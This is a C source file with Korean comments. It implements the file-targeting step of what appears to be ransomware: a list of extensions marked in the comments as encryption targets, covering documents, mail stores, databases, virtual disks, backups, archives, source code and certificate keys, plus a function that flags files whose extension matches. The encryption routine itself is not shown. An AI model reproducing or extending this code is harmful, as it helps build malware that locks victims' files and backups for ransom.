/*
 * extension.c
 *
 * 확장자 검사 함수 구현
 */
#include "extension.h"
#include <string.h>
#include <strings.h> // strcasecmp를 위해 필요 (POSIX 시스템에서 일반적)
#include <stdio.h>
#include <stddef.h>

// 암호화 대상 확장자 목록. 확장자에 '.'을 포함합니다. (소문자로 정의됨)
// 리스트의 끝은 NULL 포인터로 표시합니다.
static const char *g_target_exts[] = {
    ".doc", ".docx", ".docb", ".docm", ".dotm", ".dotx", ".xls", ".xlsx", ".xlsm", ".xlsb",
    ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".ppt", ".pptx", ".pptm", ".pot", ".pps",
    ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".pst", ".ost", ".msg", ".eml",
    ".edb", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg",
    ".onetoc2", ".snt", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".vdi", ".vmdk",
    ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz",
    ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".jpeg", ".jpg", ".bmp", ".png", ".gif",
    ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u",
    ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg",
    ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java",
    ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1",
    ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln",
    ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb",
    ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", 
    ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", 
    ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", 
    ".csr", ".crt", ".key", ".pfx", ".der",
    NULL // 리스트의 끝
};

/**
 * @brief 파일 경로에서 확장자 문자열을 찾습니다 ('.' 포함).
 * * @param path 파일 전체 경로
 * @return const char* 확장자 시작 포인터 ('.' 포함), 없으면 NULL
 */
static const char *find_ext(const char *path)
{
    const char *dot = strrchr(path, '.');
    // '.'이 없거나, 경로의 시작인 경우 (예: ".hiddenfile"이나 ".."같은 디렉토리) NULL 반환
    if (!dot || dot == path)
        return NULL;
    
    return dot;
}

/**
 * @brief 주어진 파일 경로가 대상 확장자 목록에 포함되는지 확인합니다.
 * * @param filepath 파일 전체 경로
 * @return true 대상 확장자임
 * @return false 대상 확장자가 아님
 */
bool extension_check(const char *filepath)
{
    const char *ext = find_ext(filepath);
    if (!ext)
        return false;

    // g_target_exts[] 배열을 NULL 포인터가 나올 때까지 순회합니다.
    for (size_t i = 0; g_target_exts[i] != NULL; i++) {
        // strcasecmp를 사용하여 대소문자 구분 없이 확장자를 비교합니다.
        // ext와 g_target_exts[i] 모두 '.'을 포함하고 있습니다.
        if (strcasecmp(ext, g_target_exts[i]) == 0) {
            printf("[EXT] match: %s (ext=%s)\n", filepath, ext);
            return true;
        }
    }
    return false;
}
